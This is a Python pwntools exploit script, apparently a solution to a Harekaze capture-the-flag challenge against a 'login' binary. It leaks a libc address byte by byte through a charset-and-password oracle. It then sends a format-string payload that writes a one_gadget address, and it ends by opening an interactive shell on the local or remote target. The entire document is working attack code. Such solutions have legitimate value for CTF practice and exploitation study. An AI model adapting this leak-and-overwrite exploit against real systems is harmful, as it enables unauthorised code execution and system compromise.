#!/usr/bin/env python
from pwn import *

def check(byte, offset):
    s.sendlineafter('# of charsets: ', str(offset))
    s.sendafter('charsets: ', 'A' * (offset))
    s.sendafter('password: ', chr(byte))
    res = s.recv(8, timeout = 0.1)
    if res == '':
        s.send('\0')
        s.sendlineafter('password: ', 'A')
        return True
    else:
        return False

def leak(offset):
    bset = set()
    p = log.progress('Leaking address')
    for b in range(0x100):
        p.status(hex(b))
        if b == 0x41:
            continue
        if check(b, offset): 
            bset.add(b)
    address = 0
    for i in range(6):
        for b in bset:
            if not check(b, offset + i + 1):
                bset.remove(b)
                address += b << i * 8
                break
    p.success(hex(address))
    return address

if len(sys.argv) == 1:
    s = process('./login')
else:
    s = remote('problem.harekaze.com', 20002)

libc_base = leak(0x10) - 0x61aa98
log.info('libc base: %#x' % libc_base)

payload = 'A]%11$llu'
s.sendlineafter('# of charsets: ', str(len(payload)))
s.sendafter('charsets: ', payload)

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
s.sendlineafter('password: ', 'A' + str(libc_base + one_gadgets[0]))

s.sendlineafter('# of charsets: ', '2')
s.sendlineafter('charsets: ', 'A')
s.sendlineafter('password: ', 'A')
s.sendlineafter('password: ', 'A')
s.recvuntil('bye.\n')
s.interactive()
